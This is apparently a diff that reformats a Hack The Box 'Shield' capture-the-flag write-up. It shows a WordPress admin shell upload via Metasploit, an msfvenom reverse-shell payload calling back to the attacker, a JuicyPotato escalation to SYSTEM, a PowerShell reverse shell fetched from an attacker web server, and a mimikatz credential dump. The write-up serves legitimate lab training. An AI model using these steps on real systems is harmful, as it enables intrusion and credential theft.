@@ -76,7 +76,8 @@ Running gobuster using the directory dictionary /usr/share/wordlists/dirbuster/d
 
 ```text
  ──[rin@parrot]─[~/boxes/StartingPoint/Shield]
-└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.29
+└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+              -u http://10.10.10.29
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -88,7 +89,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 [+] User Agent: gobuster/3.0.1
 [+] Timeout: 10s
 ===============================================================
-2020/10/06 21:25:51 Starting gobuster
+... Starting gobuster
 ===============================================================
 /wordpress (Status: 301)
 ```
@@ -134,7 +135,8 @@ Module options (exploit/unix/webapp/wp_admin_shell_upload):
  ---- --------------- -------- -----------
  PASSWORD P@s5w0rd! yes The WordPress password to authenticate with
  Proxies no A proxy chain of format type:host:port[,type:host:port][...]
- RHOSTS 10.10.10.29 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+ RHOSTS 10.10.10.29 yes The target host(s), range CIDR identifier, 
+ or hosts file with syntax 'file:<path>'
  RPORT 80 yes The target port (TCP)
  SSL false no Negotiate SSL/TLS for outgoing connections
  TARGETURI /wordpress yes The base path to the wordpress application
@@ -156,9 +158,11 @@ msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
 [+] Authenticated with WordPress
 [*] Preparing payload...
 [*] Uploading payload...
-[*] Executing the payload at /wordpress/wp-content/plugins/glPxlNrGRx/aaBiENhsux.php...
+[*] Executing the payload at /wordpress/wp-content/plugins
+                               /glPxlNrGRx/aaBiENhsux.php...
 [*] Sending stage (39189 bytes) to 10.10.10.29
-[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.29:55060) at 2020-10-06 14:40:38 +0800
+[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.29:55060) 
+                               at 2020-10-06 14:40:38 +0800
 [!] This exploit may require manual cleanup of 'aaBiENhsux.php' on the target
 [!] This exploit may require manual cleanup of 'glPxlNrGRx.php' on the target
 [!] This exploit may require manual cleanup of '../glPxlNrGRx' on the target
@@ -172,9 +176,13 @@ That gives us a meterpreter shell that is a little unstable and also, because it
 Then we can type
 
 ```text
-msf6 exploit(unix/webapp/wp_admin_shell_upload) > msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
-[*] exec: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > 
+    msfvenom -p windows/x64/meterpreter_reverse_tcp \
+        LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
+[*] exec: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 
+    LPORT=6001 -f exe > revshell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows 
+    from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 200262 bytes
@@ -195,7 +203,9 @@ Active sessions
 
   Id  Name  Type                     Information        Connection
   --  ----  ----                     -----------        ----------
-  1         meterpreter php/windows  IUSR (0) @ SHIELD  10.10.14.13:4444 -> 10.10.10.29:57574 (10.10.10.29)
+  1         meterpreter php/windows  IUSR (0) @ SHIELD  10.10.14.13:4444 -> 
+                                                        10.10.10.29:57574 
+                                                        (10.10.10.29)
 
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > sessions -i 1
 [*] Starting interaction with 1...
@@ -241,7 +251,8 @@ Active sessions
 ===============
  Id Name Type Information Connection
  -- ---- ---- ----------- ----------
- 1 meterpreter php/windows IUSR (0) @ SHIELD 10.10.14.3:4444 -> 10.10.10.29:56134 (10.10.10.29)
+ 1 meterpreter php/windows IUSR (0) @ SHIELD 10.10.14.3:4444 -> 10.10.10.29:56134 
+                                                                (10.10.10.29)
 msf6 exploit(multi/handler) > sessions -i 1
 [*] Starting interaction with 1...
 meterpreter >
@@ -252,7 +263,8 @@ We can then just execute the meterpreter reverse shell by executing revshell.exe
 ```text
 meterpreter > execute -f revshell.exe
 Process 3280 created.
-meterpreter > [*] Meterpreter session 2 opened (10.10.14.3:6001 -> 10.10.10.29:56135) at 2020-10-08 14:10:38 +0800
+meterpreter > [*] Meterpreter session 2 opened (10.10.14.3:6001 -> 
+                                10.10.10.29:56135) at 2020-10-08 14:10:38 +0800
 meterpreter > bg
 [*] Backgrounding session 1...
 msf6 exploit(multi/handler) > sessions -i 2
@@ -277,11 +289,16 @@ SESSION => 2
 msf6 post(multi/recon/local_exploit_suggester) > run
 [*] 10.10.10.29 - Collecting local exploits for x64/windows...
 [*] 10.10.10.29 - 26 exploit checks are being tried...
-[+] 10.10.10.29 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
-[+] 10.10.10.29 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
-[+] 10.10.10.29 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
-[+] 10.10.10.29 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
-[+] 10.10.10.29 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+[+] 10.10.10.29 - exploit/windows/local/bypassuac_sdclt: 
+    The target appears to be vulnerable.
+[+] 10.10.10.29 - exploit/windows/local/cve_2020_1048_printerdemon: 
+    The target appears to be vulnerable.
+[+] 10.10.10.29 - exploit/windows/local/cve_2020_1337_printerdemon: 
+    The target appears to be vulnerable.
+[+] 10.10.10.29 - exploit/windows/local/ms16_075_reflection: 
+    The target appears to be vulnerable.
+[+] 10.10.10.29 - exploit/windows/local/ms16_075_reflection_juicy: 
+    The target appears to be vulnerable.
 [*] Post module execution completed
 msf6 post(multi/recon/local_exploit_suggester) > 
 ```
@@ -294,14 +311,16 @@ There is a bug in the current version of Metasploit. If you get an exception "Po
 Otherwise, you can edit the file yourself:
 
 ```bash
-sudo vi /usr/share/metasploit-framework/modules/exploits/windows/local/cve_2020_1054_drawiconex_lpe.rb
+sudo vi /usr/share/metasploit-framework/modules/exploits/windows/\
+local/cve_2020_1054_drawiconex_lpe.rb
 ```
 
 and change line 112 from CheckCode::NotSupported to CheckCode::Safe
 
 ```text
 Remove this on 112 --> return CheckCode::NotSupported
-Add this instead   --> return CheckCode::Safe("No target for win32k.sys version #{build_num_gemversion}")
+Add this instead   --> return CheckCode::Safe("No target for win32k.sys 
+                                        version #{build_num_gemversion}")
 ```
 
   
@@ -313,25 +332,31 @@ From experience, I know that the most promising exploit is going to be ms16\_075
 We can run another handler as before and then upload JuicyPotato.exe. One more step however as executing it from the meterpreter prompt doesn’t work. So you can drop into a cmd.exe shell prompt by typing “shell”. From the command prompt, you can then run the JuicyPotato.exe
 
 ```bash
-JuicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337
+JuicyPotato.exe -t * -p ^
+C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337
 ```
 
 Remember to change the path of the revshell.exe to the actual path name Meterpreter has used. When JuicyPotato.exe runs, it will start another meterpreter session but as the privileged user that the exploit has impersonated, NT AUTHORITY\SYSTEM. From there, you can cd \(change directory\) into the c:\Users\Administrator directory and find the flag.
 
-```text
+```bash
 meterpreter > shell
 Process 376 created.
 Channel 2 created.
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
-C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr>JuicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337
-juicypot.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337
+C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr>JuicyPotato.exe ^
+-t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe ^
+ -l 1337
+juicypot.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\
+                         dBPEarcLsr\revshell.exe -l 1337
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 ......
 [+] authresult 0
 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
 [+] CreateProcessWithTokenW OK
-C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr>[*] Meterpreter session 3 opened (10.10.14.3:6001 -> 10.10.10.29:56144) at 2020-10-08 14:38:04 +0800
+C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr>
+   [*] Meterpreter session 3 opened (10.10.14.3:6001 -> 10.10.10.29:56144) 
+      at 2020-10-08 14:38:04 +0800
 C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr>exit
 meterpreter > sessions 3
 [*] Backgrounding session 2...
@@ -359,8 +384,10 @@ msv credentials
 ===============
 Username Domain NTLM SHA1 DPAPI
 -------- ------ ---- ---- -----
-SHIELD$ MEGACORP 9d4feee71a4f411bf92a86b523d64437 0ee4dc73f1c40da71a60894eff504cc732de82da
-sandra MEGACORP 29ab86c5c4d2aab957763e5c1720486d 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38 f4c73b3f07c4f309ebf086644254bcbc
+SHIELD$ MEGACORP 9d4feee71a4f411bf92a86b523d64437 0ee4dc73f1c40da71a
+                 60894eff504cc732de82da
+sandra MEGACORP 29ab86c5c4d2aab957763e5c1720486d 8bd0ccc2a23892a74df
+                 bbbb57f0faa9721562a38 f4c73b3f07c4f309ebf086644254bcbc
 wdigest credentials
 ===================
 Username Domain Password
@@ -374,9 +401,14 @@ Username Domain Password
 -------- ------ --------
 (null) (null) (null)
 IUSR NT AUTHORITY (null)
-SHIELD$ MEGACORP.LOCAL cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
+SHIELD$ MEGACORP.LOCAL cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,
+                 AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@
+                 -a+qJt_l887Ew&m_ewr??#VE&
 sandra MEGACORP.LOCAL Password1234!
-shield$ MEGACORP.LOCAL cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
+
+shield$ MEGACORP.LOCAL cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,
+                 AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@
+                 -a+qJt_l887Ew&m_ewr??#VE&
 ```
 
 If you follow the tutorial on Hack The Box for this machine, some things are different. A different approach is taken to using netcat for reverse shells and running mimikatz.exe directly. The end result is the same however.
@@ -395,8 +427,6 @@ Navigating to the WorPress administration site at [http://shield.htb/wordpress/w
 
 ![Successful plugin installed on Shield WordPress site](../.gitbook/assets/10%20%284%29.png)
 
-.
-
 We can now call the reverse shell by entering the url
 
 ```bash
@@ -409,7 +439,7 @@ This should first call the web server to get the PowerShell file
 ┌─[rin@parrot]─[~/boxes/StartingPoint/Shield]
 └──╼ $python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.10.10.29 - - [03/Dec/2020 13:56:58] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+10.10.10.29 - - [...] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 ```
 
 And then the reverse shell should then call netcat to give us a PowerShell prompt:
